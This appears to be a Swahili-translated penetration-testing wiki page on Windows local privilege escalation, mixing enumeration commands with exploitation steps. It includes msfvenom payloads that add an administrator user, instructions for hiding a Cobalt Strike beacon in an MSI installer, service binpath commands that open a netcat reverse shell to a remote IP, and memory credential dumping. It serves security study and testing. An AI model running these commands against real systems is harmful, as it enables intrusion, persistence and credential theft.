# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Zana bora kutafuta njia za Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Nadharia ya Awali ya Windows

### Access Tokens

**Ikiwa hujui ni nini Windows Access Tokens, soma ukurasa ufuatao kabla ya kuendelea:**

{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Angalia ukurasa ufuatao kwa maelezo zaidi kuhusu ACLs - DACLs/SACLs/ACEs:**

{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Viwango vya Uaminifu

**Ikiwa hujui ni nini viwango vya uaminifu katika Windows unapaswa kusoma ukurasa ufuatao kabla ya kuendelea:**

{{#ref}}
integrity-levels.md
{{#endref}}

## Udhibiti wa Usalama wa Windows

Kuna mambo tofauti katika Windows ambayo yanaweza **kukuzuia kuhesabu mfumo**, kuendesha executable au hata **kubaini shughuli zako**. Unapaswa **kusoma** **ukurasa** ufuatao na **kuhesabu** mifumo hii yote ya **ulinzi** **kabla** ya kuanza kuhesabu privilege escalation:

{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## Taarifa za Mfumo

### Uhesabuji wa Taarifa za Toleo

Angalia ikiwa toleo la Windows lina udhaifu wowote unaojulikana (angalia pia patches zilizotumika).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

Hii [site](https://msrc.microsoft.com/update-guide/vulnerability) ni muhimu kwa kutafuta taarifa za kina kuhusu udhaifu wa usalama wa Microsoft. Hii database ina zaidi ya udhaifu wa usalama 4,700, ikionyesha **uso mkubwa wa shambulio** ambao mazingira ya Windows yanatoa.

**Kwenye mfumo**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ina watson iliyojumuishwa)_

**Kitaifa na taarifa za mfumo**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos za exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

Je, kuna taarifa yoyote ya akidi/Juicy iliyohifadhiwa katika mabadiliko ya mazingira?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Historia ya PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript files

Unaweza kujifunza jinsi ya kuwasha hii katika [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Maelezo ya utekelezaji wa PowerShell pipeline yanarekodiwa, ikiwa ni pamoja na amri zilizotekelezwa, mwito wa amri, na sehemu za scripts. Hata hivyo, maelezo kamili ya utekelezaji na matokeo ya pato yanaweza kutokuwepo.

Ili kuwezesha hili, fuata maelekezo katika sehemu ya "Transcript files" ya hati, ukichagua **"Module Logging"** badala ya **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Ili kuona matukio 15 ya mwisho kutoka kwa kumbukumbu za PowersShell unaweza kutekeleza:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Rekodi kamili ya shughuli na maudhui yote ya utekelezaji wa script yanakamatwa, kuhakikisha kwamba kila block ya msimbo inarekodiwa inavyotekelezwa. Mchakato huu unahifadhi njia ya ukaguzi ya kina ya kila shughuli, muhimu kwa uchunguzi wa forensics na kuchambua tabia mbaya. Kwa kurekodi shughuli zote wakati wa utekelezaji, ufahamu wa kina kuhusu mchakato unapatikana.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Matukio ya kuandika kwa Script Block yanaweza kupatikana ndani ya Windows Event Viewer kwenye njia: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Ili kuona matukio 20 ya mwisho unaweza kutumia:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Mipangilio ya Mtandao
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Drives
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Unaweza kuathiri mfumo ikiwa masasisho hayajatolewa kwa kutumia http**S** bali http.

Unaanza kwa kuangalia ikiwa mtandao unatumia masasisho ya WSUS yasiyo ya SSL kwa kuendesha yafuatayo:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Ikiwa utapata jibu kama:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
Na ikiwa `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ni sawa na `1`.

Basi, **inaweza kutumika.** Ikiwa rejista ya mwisho ni sawa na 0, basi, kipengele cha WSUS kitaachwa.

Ili kutumia udhaifu huu unaweza kutumia zana kama: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Hizi ni silaha za MiTM zilizotengenezwa kwa ajili ya kuingiza 'sasisho' za uongo katika trafiki ya WSUS isiyo na SSL.

Soma utafiti hapa:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Soma ripoti kamili hapa**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Kimsingi, hii ndiyo kasoro ambayo hitilafu hii inatumia:

> Ikiwa tuna uwezo wa kubadilisha proxy yetu ya mtumiaji wa ndani, na Windows Updates inatumia proxy iliyowekwa katika mipangilio ya Internet Explorer, basi tuna uwezo wa kuendesha [PyWSUS](https://github.com/GoSecure/pywsus) ndani ili kukamata trafiki yetu wenyewe na kuendesha msimbo kama mtumiaji aliye na mamlaka kwenye mali yetu.
>
> Zaidi ya hayo, kwa kuwa huduma ya WSUS inatumia mipangilio ya mtumiaji wa sasa, pia itatumia duka lake la vyeti. Ikiwa tutaunda cheti kilichojisaini kwa jina la mwenyeji wa WSUS na kuongeza cheti hiki kwenye duka la vyeti la mtumiaji wa sasa, tutakuwa na uwezo wa kukamata trafiki ya WSUS ya HTTP na HTTPS. WSUS haitumii mitindo kama HSTS kutekeleza uthibitisho wa aina ya kuaminiwa kwa matumizi ya kwanza kwenye cheti. Ikiwa cheti kilichowasilishwa kinatambuliwa na mtumiaji na kina jina sahihi la mwenyeji, kitakubaliwa na huduma.

Unaweza kutumia udhaifu huu kwa kutumia zana [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (mara tu itakapokuwa huru).

## KrbRelayUp

Udhaifu wa **kuinua mamlaka ya ndani** upo katika mazingira ya **domaine** ya Windows chini ya hali maalum. Hali hizi ni pamoja na mazingira ambapo **saini ya LDAP haitekelezwi,** watumiaji wana haki za kujitengenezea zinazowawezesha kuunda **Resource-Based Constrained Delegation (RBCD),** na uwezo wa watumiaji kuunda kompyuta ndani ya domaine. Ni muhimu kutambua kuwa **masharti haya** yanatimizwa kwa kutumia **mipangilio ya kawaida**.

Pata **udhaifu katika** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Kwa maelezo zaidi kuhusu mtiririko wa shambulio angalia [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Ikiwa** hizi 2 za rejista zime **wezeshwa** (thamani ni **0x1**), basi watumiaji wa mamlaka yoyote wanaweza **kusanidi** (kutekeleza) `*.msi` faili kama NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Ikiwa una kikao cha meterpreter unaweza kujiendesha mbinu hii kwa kutumia moduli **`exploit/windows/local/always_install_elevated`**

### PowerUP

Tumia amri `Write-UserAddMSI` kutoka power-up kuunda ndani ya saraka ya sasa MSI binary ya Windows ili kupandisha mamlaka. Skripti hii inaandika msanidi wa MSI ulioandaliwa mapema ambao unahitaji kuongeza mtumiaji/kikundi (hivyo utahitaji ufikiaji wa GIU):
```
Write-UserAddMSI
```
Just execute the created binary to escalate privileges.

### MSI Wrapper

Soma mafunzo haya ili kujifunza jinsi ya kuunda MSI wrapper ukitumia zana hizi. Kumbuka kwamba unaweza kufunga faili ya "**.bat**" ikiwa unataka **tu** **kutekeleza** **mistari ya amri**.

{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX

{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Zalisha** na Cobalt Strike au Metasploit **payload mpya ya Windows EXE TCP** katika `C:\privesc\beacon.exe`
- Fungua **Visual Studio**, chagua **Create a new project** na andika "installer" kwenye kisanduku cha utafutaji. Chagua mradi wa **Setup Wizard** na bonyeza **Next**.
- Toa mradi jina, kama **AlwaysPrivesc**, tumia **`C:\privesc`** kwa ajili ya mahali, chagua **weka suluhisho na mradi katika saraka moja**, na bonyeza **Create**.
- Endelea kubonyeza **Next** hadi ufikie hatua ya 3 ya 4 (chagua faili za kujumuisha). Bonyeza **Add** na chagua payload ya Beacon uliyotengeneza hivi karibuni. Kisha bonyeza **Finish**.
- Taja mradi wa **AlwaysPrivesc** katika **Solution Explorer** na katika **Properties**, badilisha **TargetPlatform** kutoka **x86** hadi **x64**.
- Kuna mali nyingine unaweza kubadilisha, kama **Mwandishi** na **Mtengenezaji** ambazo zinaweza kufanya programu iliyosakinishwa ionekane kuwa halali zaidi.
- Bonyeza-kulia kwenye mradi na chagua **View > Custom Actions**.
- Bonyeza-kulia **Install** na chagua **Add Custom Action**.
- Bonyeza mara mbili kwenye **Application Folder**, chagua faili yako ya **beacon.exe** na bonyeza **OK**. Hii itahakikisha kwamba payload ya beacon inatekelezwa mara tu installer inapotekelezwa.
- Chini ya **Custom Action Properties**, badilisha **Run64Bit** kuwa **True**.
- Hatimaye, **ijenge**.
- Ikiwa onyo `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` linaonyeshwa, hakikisha umeweka jukwaa kuwa x64.

### MSI Installation

Ili kutekeleza **ufungaji** wa faili ya .msi yenye madhara katika **background:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Ili kutumia udhaifu huu unaweza kutumia: _exploit/windows/local/always_install_elevated_

## Antivirus na Vifaa vya Kugundua

### Mipangilio ya Ukaguzi

Mipangilio hii inaamua nini kinachorekodiwa, hivyo unapaswa kulipa kipaumbele
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, ni muhimu kujua wapi kumbukumbu zinatumwa
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** imeundwa kwa ajili ya **usimamizi wa nywila za Msimamizi wa ndani**, kuhakikisha kwamba kila nywila ni **ya kipekee, iliyopangwa kwa nasibu, na inasasishwa mara kwa mara** kwenye kompyuta zilizounganishwa na eneo. Nywila hizi zinahifadhiwa kwa usalama ndani ya Active Directory na zinaweza kufikiwa tu na watumiaji ambao wamepewa ruhusa ya kutosha kupitia ACLs, kuwapa uwezo wa kuona nywila za msimamizi wa ndani ikiwa wameidhinishwa.

{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ikiwa inafanya kazi, **nywila za maandiko wazi zinahifadhiwa katika LSASS** (Local Security Authority Subsystem Service).\
[**Maelezo zaidi kuhusu WDigest katika ukurasa huu**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Kuanzia na **Windows 8.1**, Microsoft ilianzisha ulinzi ulioimarishwa kwa Mamlaka ya Usalama wa Mitaa (LSA) ili **kuzuia** juhudi za michakato isiyoaminika **kusoma kumbukumbu zake** au kuingiza msimbo, hivyo kuimarisha usalama wa mfumo.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** ilianzishwa katika **Windows 10**. Lengo lake ni kulinda akiba za taarifa za kuingia zilizohifadhiwa kwenye kifaa dhidi ya vitisho kama vile mashambulizi ya pass-the-hash.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Akikodi za kikoa** zinathibitishwa na **Mamlaka ya Usalama wa Mitaa** (LSA) na kutumiwa na vipengele vya mfumo wa uendeshaji. Wakati data za kuingia za mtumiaji zinathibitishwa na kifurushi cha usalama kilichosajiliwa, akikodi za kikoa kwa mtumiaji kwa kawaida huanzishwa.\
[**Maelezo zaidi kuhusu Akikodi za Cached hapa**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Watumiaji & Vikundi

### Tambua Watumiaji & Vikundi

Unapaswa kuangalia kama kuna vikundi ambavyo unahusishwa navyo vina ruhusa za kuvutia
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Vikundi vya Kipekee

Ikiwa wewe **ni mwanachama wa kundi lolote la kipekee unaweza kuwa na uwezo wa kupandisha hadhi**. Jifunze kuhusu vikundi vya kipekee na jinsi ya kuvunja sheria zao ili kupandisha hadhi hapa:

{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulering ya Token

**Jifunze zaidi** kuhusu nini maana ya **token** katika ukurasa huu: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Angalia ukurasa ufuatao ili **ujifunze kuhusu token za kuvutia** na jinsi ya kuzitumia vibaya:

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Watumiaji waliounganishwa / Sesheni
```bash
qwinsta
klist sessions
```
### Nyumba za nyaraka
```powershell
dir C:\Users
Get-ChildItem C:\Users
```
### Sera ya Nywila
```bash
net accounts
```
### Pata maudhui ya clipboard
```bash
powershell -command "Get-Clipboard"
```
## Kuendesha Mchakato

### Ruhusa za Faili na Folda

Kwanza kabisa, orodhesha mchakato **angalia nywila ndani ya mstari wa amri wa mchakato**.\
Angalia kama unaweza **kufuta baadhi ya binary inayokimbia** au kama una ruhusa za kuandika kwenye folda ya binary ili kutumia [**shambulio la DLL Hijacking**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Daima angalia uwezekano wa [**electron/cef/chromium debuggers** zinazoendesha, unaweza kuzitumia kuboresha mamlaka](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Kuangalia ruhusa za binaries za michakato**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Kuangalia ruhusa za folda za binaries za michakato (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Unaweza kuunda dump ya kumbukumbu ya mchakato unaoendesha ukitumia **procdump** kutoka sysinternals. Huduma kama FTP zina **akili wazi katika kumbukumbu**, jaribu kutupa kumbukumbu na kusoma akili hizo.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Insecure GUI apps

**Programu zinazotembea kama SYSTEM zinaweza kumruhusu mtumiaji kuzindua CMD, au kuvinjari saraka.**

Mfano: "Windows Help and Support" (Windows + F1), tafuta "command prompt", bonyeza "Click to open Command Prompt"

## Services

Pata orodha ya huduma:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Permissions

Unaweza kutumia **sc** kupata taarifa za huduma
```bash
sc qc <service_name>
```
Inashauriwa kuwa na binary **accesschk** kutoka _Sysinternals_ ili kuangalia kiwango cha ruhusa kinachohitajika kwa kila huduma.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Inashauriwa kuangalia kama "Authenticated Users" wanaweza kubadilisha huduma yoyote:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Unaweza kupakua accesschk.exe kwa XP hapa](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Wezesha huduma

Ikiwa unapata kosa hili (kwa mfano na SSDPSRV):

_Kosa la mfumo 1058 limetokea._\
_Huduma haiwezi kuanzishwa, ama kwa sababu imezimwa au kwa sababu haina vifaa vilivyoanzishwa vinavyohusishwa nayo._

Unaweza kuifanya iweze kutumia
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Kumbuka kwamba huduma ya upnphost inategemea SSDPSRV ili kufanya kazi (kwa XP SP1)**

**Njia nyingine** ya kutatua tatizo hili ni kukimbia:
```
sc.exe config usosvc start= auto
```
### **Badilisha njia ya binary ya huduma**

Katika hali ambapo kundi la "Watumiaji walioidhinishwa" lina **SERVICE_ALL_ACCESS** kwenye huduma, mabadiliko ya binary ya kutekeleza ya huduma yanawezekana. Ili kubadilisha na kutekeleza **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Anzisha huduma
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privileges zinaweza kupandishwa kupitia ruhusa mbalimbali:

- **SERVICE_CHANGE_CONFIG**: Inaruhusu kubadilisha usanidi wa huduma.
- **WRITE_DAC**: Inaruhusu kubadilisha ruhusa, ikisababisha uwezo wa kubadilisha usanidi wa huduma.
- **WRITE_OWNER**: Inaruhusu kupata umiliki na kubadilisha ruhusa.
- **GENERIC_WRITE**: Inarithi uwezo wa kubadilisha usanidi wa huduma.
- **GENERIC_ALL**: Pia inarithi uwezo wa kubadilisha usanidi wa huduma.

Kwa ajili ya kugundua na kutumia udhaifu huu, _exploit/windows/local/service_permissions_ inaweza kutumika.

### Huduma binaries ruhusa dhaifu

**Angalia kama unaweza kubadilisha binary inayotekelezwa na huduma** au kama una **ruhusa za kuandika kwenye folda** ambapo binary iko ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Unaweza kupata kila binary inayotekelezwa na huduma kwa kutumia **wmic** (sio katika system32) na kuangalia ruhusa zako kwa kutumia **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Unaweza pia kutumia **sc** na **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Services registry modify permissions

Unapaswa kuangalia kama unaweza kubadilisha ruhusa za huduma yoyote ya rejista.\
Unaweza **kuangalia** ruhusa zako juu ya **rejista** ya huduma kwa kufanya:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Inapaswa kuangaliwa ikiwa **Authenticated Users** au **NT AUTHORITY\INTERACTIVE** wana ruhusa za `FullControl`. Ikiwa ndivyo, faili ya binary inayotekelezwa na huduma inaweza kubadilishwa.

Ili kubadilisha Njia ya faili ya binary inayotekelezwa:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Huduma za rejista Ruhusa za AppendData/AddSubdirectory

Ikiwa una ruhusa hii juu ya rejista hii inamaanisha **unaweza kuunda sub-rejista kutoka hii**. Katika kesi ya huduma za Windows hii ni **ya kutosha kutekeleza msimbo wowote:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Njia za Huduma zisizo na Nukuu

Ikiwa njia ya executable haiko ndani ya nukuu, Windows itajaribu kutekeleza kila kitu kinachomalizika kabla ya nafasi.

Kwa mfano, kwa njia _C:\Program Files\Some Folder\Service.exe_ Windows itajaribu kutekeleza:
```powershell
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Orodha ya njia za huduma zisizo na nukuu, ukiondoa zile zinazomilikiwa na huduma za Windows zilizojengwa ndani:
```powershell
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```powershell
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```powershell
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Unaweza kugundua na kutumia** udhaifu huu kwa kutumia metasploit: `exploit/windows/local/trusted\_service\_path` Unaweza kuunda binary ya huduma kwa mikono kwa kutumia metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Hatua za Kuokoa

Windows inaruhusu watumiaji kubaini hatua zitakazochukuliwa ikiwa huduma itashindwa. Kipengele hiki kinaweza kuwekewa mipangilio ili kiashirie faili la binary. Ikiwa faili hili la binary linaweza kubadilishwa, kupandisha hadhi kunaweza kuwa na uwezekano. Maelezo zaidi yanaweza kupatikana katika [nyaraka rasmi](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Maombi

### Maombi Yaliyosakinishwa

Angalia **idhini za binaries** (labda unaweza kubadilisha moja na kupandisha hadhi) na za **maktaba** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Ruhusa za Kuandika

Angalia kama unaweza kubadilisha faili fulani ya usanidi ili kusoma faili maalum au ikiwa unaweza kubadilisha faili fulani ambayo itatekelezwa na akaunti ya Msimamizi (schedtasks).

Njia moja ya kupata ruhusa dhaifu za folda/faili katika mfumo ni kufanya:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Run at startup

**Angalia kama unaweza kubadilisha baadhi ya registry au binary ambayo itatekelezwa na mtumiaji tofauti.**\
**Soma** **ukurasa ufuatao** kujifunza zaidi kuhusu maeneo ya **autoruns ya kuvutia ili kupandisha mamlaka**:

{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

